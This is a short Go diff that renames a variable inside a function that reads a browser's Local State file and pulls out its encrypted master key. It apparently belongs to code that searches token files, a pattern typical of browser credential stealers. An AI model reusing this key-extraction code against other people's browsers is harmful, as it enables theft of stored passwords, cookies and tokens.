@@ -97,11 +97,11 @@ func regexSearchTokenFiles(filePaths []string, pattern string) (matches []string
 // Outputs are the decrypted key and an error value if encountered.
 func getDecryptionKey(stateFilePath string) (decryptionKey []byte, err error) {
 	// Read the Local State file in as a byte sequence 
-	b, err := os.ReadFile(stateFilePath)
+	stateFileBytes, err := os.ReadFile(stateFilePath)
 		if err != nil {return nil, err}
 
 	// Parse out the encrypted value of the decryption key
-	b64EncodedKey := gjson.Get(string(b), "os_crypt.encrypted_key")
+	b64EncodedKey := gjson.Get(string(stateFileBytes), "os_crypt.encrypted_key")
 		if err != nil {return nil, err}
 
 	// Base64 decode the decryption key
